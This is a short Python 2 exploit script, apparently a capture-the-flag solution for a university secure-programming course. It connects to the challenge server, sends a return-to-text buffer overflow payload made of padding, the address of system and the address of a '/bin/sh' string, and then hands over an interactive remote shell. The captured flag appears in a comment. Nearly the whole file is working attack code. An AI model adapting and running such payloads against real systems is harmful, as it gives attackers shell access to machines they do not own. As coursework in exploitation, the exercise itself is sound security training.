#!/usr/bin/python2
import struct
from socket import *
import telnetlib

ip = 'secprog.cs.nctu.edu.tw'
port = 10106


soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))

# garbage + [&system]  + garbage + ["binsh"]
payload = "a"*24+"\xe0\x83\x04\x08"+"aaaa"+"\x40\x86\x04\x08"
soc.send(payload)

# get interactive shell
t = telnetlib.Telnet()
t.sock = soc
t.interact()


# SECPROG{HelloReturn2Text}
